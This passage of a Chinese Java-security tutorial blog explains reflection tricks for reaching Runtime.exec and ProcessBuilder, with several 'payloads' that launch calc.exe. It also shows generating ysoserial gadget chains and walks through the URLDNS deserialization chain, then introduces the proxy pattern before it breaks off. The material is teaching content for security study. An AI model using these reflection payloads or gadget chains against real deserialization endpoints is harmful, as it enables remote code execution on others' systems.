+<p>我们分析上面两行代码，首先通过反射将<code>java.lang.Runtime</code>中的所有属性和方法存到了clazz中，继续利用反射拿到clazz（Runtime）中的<code>exec</code>方法，最后使用invoke执行该方法，问题就出在乐invoke的参数上。</p>
+<p>我们上面提到了invoke执行方法，第一个参数是该方法所在的对象或者类，也就是说我们需要通过<code>clazz.newInstance</code>来实例化clazz，作为invoke的参数，但clazz的构造函数来自于Runtime，我们看一下Runtime的构造函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181331852.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209181331852.png"></p>
+<p>Runtime的构造方法为私有，所以在newInstance时才会报错。</p>
+<p>这里P神的<strong>java安全漫谈</strong>里说明了为什么要将构造方法设为私有，这就是很常见的“单例模式”。</p>
+<p>比如对于web应用来说，数据库只需要建立一次链接，而不是每次用到数据库都要建立一次新的连接，作为开发者就可以将数据库连接使用的构造函数设为私有，然后编写一个静态方法来获取：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class TrainDB() {</span><br><span class="line">	private static TrainDB instance = new TrainDB();</span><br><span class="line"></span><br><span class="line">	public static TrainDB getInstance() {</span><br><span class="line">		return instance;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	private TrainDB() {</span><br><span class="line">	// 建立连接的代码</span><br><span class="line">	}</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>在这个类初始化时，就会在类内部实例化出一个连接数据库的对象，我们在需要数据库连接时，只需要调用其中的<code>getInstance()</code>方法获取这个对象即可。</p>
+<p>回到如何执行命令上，如果不能通过实例化调用方法，我们就可以尝试继续通过反射来调用方法，我们将代码改成下面这样就可以了：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forname("java.lang.Runtime");</span><br><span class="line">clazz.getMethod("exec",String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz),"calc.exe");</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>我们在刚开始执行命令时就用到了Runtime来获取其中的<code>exec</code>方法，不难看出它和python的os类似，给我们提供了一些可以执行命令的方法，那么Runtime到底有什么作用？<br>每当我们执行一个java程序时，Runtime类都会生成一个实例，来储存当前运行的java程序的相关信息，我们可以通过Runtime类中的<code>getRuntime()</code>方法来调用当前java程序的运行环境（也就是上面提到的储存相关信息的实例），这样就可以在执行系统命令时让jvm知道我们要对哪个java程序执行命令</p>
+<p>我们分析以下上面执行命令的两行代码</p>
+<ul>
+<li>通过反射获得Runtime类</li>
+<li>通过反射获得clazz(Runtime)中的<code>exec</code>方法</li>
+<li><code>invoke()</code>调用exec方法</li>
+<li>调用<code>getRuntime()</code>将当前java程序运行的环境作为参数传递给invoke，并执行命令<code>exec "calc.exe"</code></li>
+</ul>
+<p>可以发现我们在用invoke执行Runtime中的命令时，如果不能通过<code>newInstance</code>来实例化对象作为参数，我们可以通过调用<code>getRuntime()</code>来获取当前环境，从而代替invoke的第一个参数。</p>
+<p>上面执行命令的两行代码分解开就是：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forname("java.lang.Runtime");</span><br><span class="line">Method execMethod = clazz.getMethod("exec", String.class);</span><br><span class="line">Method getRuntime = clazz.getMethod("getRuntime")；</span><br><span class="line">Object currentRuntime = getRuntime.invoke(clazz);</span><br><span class="line">execMethod.invoke(currentRuntime, "calc.exe");</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<h2 id="一些其他的反射机制"><a href="#一些其他的反射机制" class="headerlink" title="一些其他的反射机制"></a><strong>一些其他的反射机制</strong></h2><ul>
+<li>我们刚才说到可以通过forname拿到了一个类，并且继续利用反射或实例化调用其中的方法，如果一个类没有无参构造方法或者也没有类似单例模式里的静态方法，那我们应该怎样通过反射实例化该类呢？</li>
+<li>如果一个方法或构造方法是私有方法，我们应该怎么去执行它呢？</li>
+</ul>
+<h3 id="利用ProcessBuilder执行命令"><a href="#利用ProcessBuilder执行命令" class="headerlink" title="利用ProcessBuilder执行命令"></a><strong>利用<code>ProcessBuilder</code>执行命令</strong></h3><p>第一个问题，我们可以用一个新的反射方法<code>getConstructor</code>。</p>
+<p>和getMethod类似，<code>getConstructor</code>接收的参数是构造函数的的列表类型，因为构造函数也支持重载，所以要用参数列表类型才能唯一确定一个构造函数</p>
+<p>比如我们常用的另一种执行命令的方式ProcessBuilder，我们使用反射来获取其构造函数，然后 调用<code>start()</code>来执行命令</p>
+<p><strong>ProcessBuilder:</strong></p>
+<p>ProcessBuilder用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法，我们可以通过实例化这个类并且通过反射调用其中的start方法来开启一个子进程 ，我们可以理解成当<code>getRuntime</code>被禁用时，可以用<code>ProcessBuilder</code>来执行命令。</p>
+<p><code>ProcessBuilder</code>有两个构造函数：</p>
+<ul>
+<li><code>public ProcessBuilder(List&lt;String&gt; command)</code></li>
+<li><code>public ProcessBuilder(String... commang)</code></li>
+</ul>
+<p>我们用<code>ProcessBuilder</code>写一个执行命令的payload：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName("java.lang.ProcessBuilder");</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))).start();</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<ol>
+<li>首先利用反射获取<code>ProcessBuilder</code>类；</li>
+<li>获取clazz(ProcessBuilder)形参列表为<code>List&lt;String&gt; command</code>的构造函数；</li>
+<li>将获取到的构造函数利用newInstance进行实例化，调用构造函数；</li>
+<li>对构造函数传入的参数为 <code>calc.exe</code>，并且用<code>Arrays.asList</code>方法将要执行的命令转为List类型；</li>
+<li>返回List类型的<code>command</code>； <img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201439885.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201439885.png"> <img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201440303.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201440303.png"><ol>
+<li>将List类型的command强制转换为<code>ProcessBuilder</code>类型，这样就可以调用<code>ProcessBuilder</code>中的start方法打开<code>calc.exe</code>进程。 <img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201442162.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201442162.png"></li>
+</ol>
+ 可以看到这个方法需要用到强转，但有时候在利用漏洞时并没有这种语法，所以我们接着利用反射来完成这一步 <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName("java.lang.ProcessBuilder"); clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe")));</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<ol>
+<li>forName获取类；</li>
+<li>获取clazz中的<code>start</code>方法；</li>
+<li>用invoke执行start方法，这里我们之前说过用invoke执行方法时，第一个参数要是该方法所在类的对象，但clazz中没有无参构造方法，所以invoke的第一个参数不能是<code>clazz.newInstance</code>，所以这里我们换个方法，通过<code>getConstructor</code>获取到<code>ProcessBuilder</code>的构造函数，并利用这个构造函数<code>newInstance</code>，在实例化的同时对构造方法传入参数<code>calc.exe</code>，因为我们刚才提到了<code>ProcessBuilder</code>是没有无参构造函数的，所以在实例化的时候必须要传入参数。（这里获取的构造方法依然是上面提到的形参列表为List的构造函数）</li>
+</ol>
+ 那么我们再来看<code>ProcessBuilder</code>的另一个构造方法： <img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201459962.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201459962.png"> 我们看到这个构造方法的参数列表为<code>String... command</code>，这个参数列表的意思其实就是参数数量可变列表，当我们在写一个方法时，不知道要传入多少参数，我们就可以写成<code>Type... Args</code>的方式，其实在底层来看<code>String... command</code>这样的写法就等效于<code>String[] command</code>，相当于传入了一个字符数组 比如有一个hello方法： <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public void hello(String...names){}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+ 如果我们有一个数组想传给y1方法，只需要直接传就行： <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String[] names = {"hello", "world"};</span><br><span class="line">hello(names)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+ 所以如果我们想要获取到参数列表为<code>String... command</code> 的这个构造方法，我们在<code>getConstructor</code>时要传入的参数为<code>String[].class</code>，在调用newInstance时，因为这个构造方法本身接受的就是一个可变长数组，我们在传入时也传入了一个数组，因此叠加起来是一个二维数组，所以利用这个构造方法的payload如下： <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName("java.lang.ProcessBuilder");</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[]{{"calc.exe"}})).start();</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<ol>
+<li>反射拿到类；</li>
+<li><code>getConstructor</code>拿到参数列表为<code>String... command</code>的构造方法；</li>
+<li><code>newInstance</code>触发该构造方法，并且传入一个二维字符数组；</li>
+<li>由于返回的command是字符数组类型，所以强转为<code>ProcessBuilder</code>并用<code>start()</code>方法触发；</li>
+</ol>
+</li>
+</ol>
+<h3 id="如何通过反射执行私有方法"><a href="#如何通过反射执行私有方法" class="headerlink" title="如何通过反射执行私有方法"></a>如何通过反射执行私有方法</h3><p>再回到第二个问题上，如果一个方法或构造方法是private，我们是否能执行它呢？</p>
+<p>这里就要用到<code>getDeclared</code>系列的反射了，与普通的<code>getMethod，getConstructor</code>区别是：</p>
+<ul>
+<li><code>getMethod</code>系列方法获取的是当前类中所有公共方法，包括从父类继承的方法；</li>
+<li><code>getDeclaredMethod</code>系列方法获取的是当前类中“声明”的方法，是实写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了</li>
+</ul>
+<p>在用法上<code>getDeclaredMethod</code>的具体用法与<code>getMethod</code>类似，<code>getDeclaredConstructor</code>的具体用法和<code>getConstructor</code>类似</p>
+<p>举个例子，我们之前提到过Runtime的构造方法是私有的，所以我们要通过<code>Runtime.getRuntime()</code>来获取对象，其实我们也可以直接用<code>getDeclaredConstructor</code>来获取这个私有的构造方法实例化对象，进而执行命令：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName("java.lang.Runtime");</span><br><span class="line">        Constructor m =clazz.getDeclaredConstructor();</span><br><span class="line">        m.setAccessible(true);</span><br><span class="line">        clazz.getMethod("exec",String.class).invoke(m.newInstance(), "calc.exe");</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>这里我们在获取到私有方法后，要用<code>setAccessible()</code>方法使这个私有方法可以被访问，其他的就和之前介绍的反射一样了，如果不用<code>setAccessible()</code>方法修改作用域这个方法是仍然不能调用的</p>
+<p>————————————————————————————————————————————</p>
+<h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a><strong>ysoserial</strong></h2><p>在上手java反序列化的第一条链子之前，我们需要一个集成了java反序列化各种gadget chains（利用链）的工具，<a class="link" target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial<i class="fas fa-external-link-alt"></i></a>。</p>
+<p>ysoserial下载好后还需要再安装一些其他的依赖，教程网上有很多，我就不细说了，我们先简单了解一下ysoserial中一些比较重要的东西。</p>
+<p>首先是序列化（Serialize）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042134404.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042134404.png"></p>
+<p>这个序列化操作和我之前提到的基本是一样的，将一个对象以字节流的形式输出并保存，并触发它的writeObject。</p>
+<p>反序列化（Unserialize 再ysoserial中叫Deserialize）：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042135076.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042135076.png"></p>
+<p>将一个字节流读入还原为对象并触发它的readObject。</p>
+<p>Payloadrunner：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042136702.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042136702.png"></p>
+<p>可以看到在Payloadrunner中，先将对象序列化再反序列化，其实就是用来运行我们的链，并生成相应的payload，具体执行命令（用cc链举例）：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 "id"</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果我们直接再intellij中运行这些链，不会出现payload，并且要注意一个问题，在java反序列化中几乎我们反序列化执行命令的结果是没有回显的，所以我们需要用一些比较明显的命令让我们知道这个链子被成功触发了，在ysoserial中我们一般用计算器<code>calc.exe</code>，一般来说ysoserial安装好后payload默认的参数是<code>calc.exe</code>，如果不是的话就要自己手动设置默认参数了，具体的我就不多说了。</p>
+<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a><strong>URLDNS</strong></h2><p>那么我们来上手java反序列化的第一条链子，<code>URLDNS</code>，这条链子的利用链很短，我们看一下ysoserial中的代码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public class URLDNS implements ObjectPayload&lt;Object&gt; {</span><br><span class="line"></span><br><span class="line">        public Object getObject(final String url) throws Exception {</span><br><span class="line"></span><br><span class="line">                //Avoid DNS resolution during payload creation</span><br><span class="line">                //Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br><span class="line">                URLStreamHandler handler = new SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = new HashMap(); // HashMap that will contain the URL</span><br><span class="line">                URL u = new URL(null, url, handler); // URL to use as the Key</span><br><span class="line">                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><span class="line"></span><br><span class="line">                return ht;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        public static void main(final String[] args) throws Exception {</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="line">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="line">         * using the serialized object.&lt;/p&gt;</span><br><span class="line">         *</span><br><span class="line">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="line">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="line">         * second resolution.&lt;/p&gt;</span><br><span class="line">         */</span><br><span class="line">        static class SilentURLStreamHandler extends URLStreamHandler {</span><br><span class="line"></span><br><span class="line">                protected URLConnection openConnection(URL u) throws IOException {</span><br><span class="line">                        return null;</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                protected synchronized InetAddress getHostAddress(URL u) {</span><br><span class="line">                        return null;</span><br><span class="line">                }</span><br><span class="line">        }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>一点点分析一下，首先从URL的创建开始：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">URLStreamHandler handler = new SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = new HashMap(); // HashMap that will contain the URL</span><br><span class="line">                URL u = new URL(null, url, handler); // URL to use as the Key</span><br><span class="line">                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>先是用<code>URLStreamHandler</code>c创建了一个句柄，这个句柄可以打开一个指定的url。</li>
+<li>创建一个哈希表，并将url对象u作为key存入到了哈希表中。</li>
+</ul>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Reflections.setFieldValue(u, "hashCode", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><span class="line"></span><br><span class="line">                return ht;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        public static void main(final String[] args) throws Exception {</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        }</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>这里将url对象u的hashCode设置成了-1，为什么要这么做我们一会在分析具体的触发过程时会提到。</li>
+<li>返回了哈希表对象ht，并用PayloadRunner运行该利用链。</li>
+</ul>
+<p>这段代码就干了这些事，那么是怎么触发反序列化的呢，我们之前提到过在反序列化时会触发readObject，那么我们直接去看Hashmap的readObject方法：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042158533.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042158533.png"></p>
+<p>最重要的一行就是最后的<code>putValue</code>，里面计算了哈希表的键名。我们跟一下<code>putValue</code>方法，发现利用hash方法计算了哈希表的key。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042238521.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042238521.png"></p>
+<p>我们再继续跟进hash方法，发现这里调用了哈希表key的hashcode方法，我们回到刚才创建哈希表时，是把url对象存入到了key中，所以我们直接去找<code>java.net.URL</code>的<code>hashCode</code>方法。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042239894.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042239894.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042246526.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042246526.png"></p>
+<p>如果hashCode值不为-1，那么就会return，这个就是我们前面提到要将hashCode的值设置为-1的原因。</p>
+<p>我们继续跟，handler此时是一个<code>URLStreamHandler</code>对象，继续跟进它的hashCode方法。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248715.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248715.png"></p>
+<p>这里调用了getHostAddress方法，继续跟。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248820.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248820.png"></p>
+<p>到这里可以看到<code>InetAddress.getByName(host)</code>的作用是根据主机名，获取其ip地址，在网络上就是一次DNS查询，我们可以通过burp的<code>Collaborator client</code>来看到这次url请求。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210051442767.png" alt="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210051442767.png"></p>
+<h1 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h1><p>在Spirng中，AOP的底层实现就是代理模式，代理模式分为两种：</p>
+<ul>
+<li>静态代理</li>
+<li>动态代理</li>
+</ul>
+<h2 id="什么是代理？"><a href="#什么是代理？" class="headerlink" title="什么是代理？"></a>什么是代理？</h2><p>我们用一个租房的例子来说明，按照正常的逻辑来讲，房东想要将自己的房子出租，并且此时有一个租客想租这个房子，那么租客就可以直接找到房东完成租房子这件事：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/Untitled%201.png"></p>
+<p>但是现在房东不想处理一些在租房过程中需要进行的繁琐步骤，比如打广告啊，和租客议价等等，所以这时候出现了一个新角色，叫做中介，那么此时房东所做的事只有出租自己的房子，其他事项全部交由中介来做，所以这个时候租客如果想租房子是不能直接找到房东的，必须在中间经由中介，中介来完成大部分事宜，并且在此时中介与房东共同完成租房这件事：</p>
+<p><img lazyload="" alt="image" data-src="https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/Untitled.png"></p>
+<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>角色分析：</p>
+<ul>
+<li>抽象角色（租房这件事）：一般会使用抽象类或者接口来解决</li>
+<li>真实角色（房东）：被代理的角色</li>
+<li>代理角色（中介）：代理真实角色，代理真实角色后，我们一般会做一些附属操作</li>
+<li>客户（租客）：访问代理对象的人</li>
+</ul>
+<p>代码实现：</p>
+<p>租房 Rent接口：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Rent</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>房东 Host类：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Host</span> <span class="keyword">implements</span> <span class="title class_">Rent</span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span></span><br><span class="line">    {</span><br><span class="line">        System.out.println(<span class="string">"房东要出租房子"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>中介 Proxy类：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">Rent</span>{</span><br><span class="line">    <span class="keyword">private</span> Host host;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Proxy</span><span class="params">()</span> {</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Proxy</span><span class="params">(Host host)</span> {</span><br><span class="line">        <span class="built_in">this</span>.host = host;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rent</span><span class="params">()</span>{</span><br><span class="line">        host.rent();</span><br><span class="line">        seeHouse();</span><br><span class="line">        getFare();</span><br><span class="line">    };</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">seeHouse</span><span class="params">()</span></span><br><span class="line">    {</span><br><span class="line">        System.out.println(<span class="string">"中介带你看房"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getFare</span><span class="params">()</span></span><br><span class="line">    {</span><br><span class="line">        System.out.println(<span class="string">"中介收中介费了"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>租客 Client类：</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y1zh3e7.demo01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Host</span>();</span><br><span class="line">        <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(host);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>可以发现房东只专注实现了租房这件事，而中介不仅帮房东实现了租房，而且自己也添加了格外的功能，比如看房收中介费等等。</p>
+<p>代理模式的好处：</p>
+<ul>
+<li>可以时真是角色的目的更加纯粹，不用去关注一些公共的业务</li>
+<li>公共业务交给代理角色，实现了业务的分工</li>
+<li>公共业务发生扩展时，便于集中管理</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>一个真实角色就会产生一个代理角色，代码量翻倍，开发效率变低</li>
+</ul>
+<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><ul>
+<li>动态代理和静态代理角色一样</li>
+<li>动态代理的代理类是自动生成的，不是我们直接写好的</li>
+<li>动态代理分为三大类：<ul>
+<li>基于接口的动态代理——JDK的动态代理</li>
+<li>基于类的动态代理——cglib</li>
+<li>java字节码实现——Javassist</li>
+</ul>
+</li>
+</ul>
+<p>动态代理需要了解两个类：Proxy：代理，InvocationHandler：调用处理程序</p>
+<p>整个动态代理大概流程如下：</p>
+<ul>
+<li>Proxy.newProxyInstance 生成一个动态代理对象proxy，并且告诉这个proxy要代理哪个接口，这里注意此时必须要是接口才行，动态代理是无法代理一个类的，因此当动态代理接收到一个类时要转为该类所继承的接口。</li>
